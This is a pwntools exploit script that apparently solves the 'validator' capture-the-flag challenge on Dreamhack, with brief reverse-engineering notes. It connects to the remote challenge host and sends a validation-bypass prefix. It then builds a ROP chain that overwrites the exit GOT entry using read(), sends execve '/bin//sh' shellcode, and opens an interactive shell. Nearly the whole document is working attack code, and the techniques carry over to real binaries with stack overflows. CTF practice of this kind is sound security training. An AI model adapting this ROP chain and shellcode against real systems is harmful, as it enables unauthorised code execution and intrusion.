from pwn import *

#p = process("./validator_server")
p = remote("host3.dreamhack.games", '17492')
e = ELF("./validator_dist")
r = ROP(e)

# Logic bypass
payload=b"DREAMHACK!"

for i in range(126,0,-1):
    payload += bytes([i])

# find gadget
read_plt = e.plt['read']
exit_got = e.got['exit']
pop_rdi = r.find_gadget(['pop rdi'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi','pop r15'])[0]
pop_rdx = r.find_gadget(['pop rdx'])[0]

# read(0, exit_got, 0x200)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(exit_got) + p64(0)
payload += p64(pop_rdx) + p64(0x200)
payload += p64(read_plt)

# call exit()
payload += p64(exit_got)

p.send(payload)

p.send(b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")

p.interactive()


'''
validate:
  rdi rbp-0x18
  rsi rbp-0x20

  for(i = 0 ; i <= 9 ; ++i)
    if(i+)

main:
  [rbp-0x80]
  memset 0x10
  read 0x400
  call validate(string, 128)
'''